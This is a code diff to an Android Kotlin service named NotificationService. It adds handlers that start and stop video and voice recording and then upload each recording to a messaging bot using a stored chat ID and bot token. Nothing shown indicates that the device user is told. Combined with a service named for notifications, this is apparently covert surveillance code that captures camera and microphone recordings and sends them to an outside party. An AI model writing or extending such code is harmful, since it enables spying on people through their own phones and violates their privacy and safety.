@@ -77,3 +77,38 @@ class NotificationService : Service() {
                     }
                 }
             }
+        }
+    }
+
+    fun handleStartVideoRecording() {
+        botHelper.startVideoRecording()
+    }
+
+    fun handleStopVideoRecording() {
+        scope.launch {
+            val file = botHelper.stopVideoRecording()
+            if (file != null && file.exists()) {
+                val uploadResult = botHelper.sendVideoToBot(file, chatId, botToken, "Recorded Video")
+                if (uploadResult.isFailure) {
+                    Log.e("NotificationService", "Failed to send video: ${uploadResult.exceptionOrNull()?.message}")
+                }
+            }
+        }
+    }
+
+    fun handleStartVoiceRecording() {
+        botHelper.startVoiceRecording()
+    }
+
+    fun handleStopVoiceRecording() {
+        scope.launch {
+            val file = botHelper.stopVoiceRecording()
+            if (file != null && file.exists()) {
+                val uploadResult = botHelper.sendVoiceToBot(file, chatId, botToken)
+                if (uploadResult.isFailure) {
+                    Log.e("NotificationService", "Failed to send voice: ${uploadResult.exceptionOrNull()?.message}")
+                }
+            }
+        }
+    }
+}
